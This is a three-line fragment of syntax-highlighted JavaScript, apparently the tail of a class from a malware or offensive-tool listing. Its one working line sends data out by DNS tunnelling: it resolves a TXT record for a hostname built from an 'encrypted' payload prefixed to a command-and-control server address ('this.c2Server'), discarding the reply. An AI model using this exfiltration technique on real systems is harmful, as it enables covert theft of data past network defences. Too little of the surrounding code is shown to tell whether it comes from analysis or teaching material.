<span class="line-numbers">081</span>        dns.resolveTxt(<span class="syntax-string">`${encrypted}.${<span class="syntax-keyword">this</span>.c2Server}`</span>, () => {});
<span class="line-numbers">082</span>    }
<span class="line-numbers">083</span>}
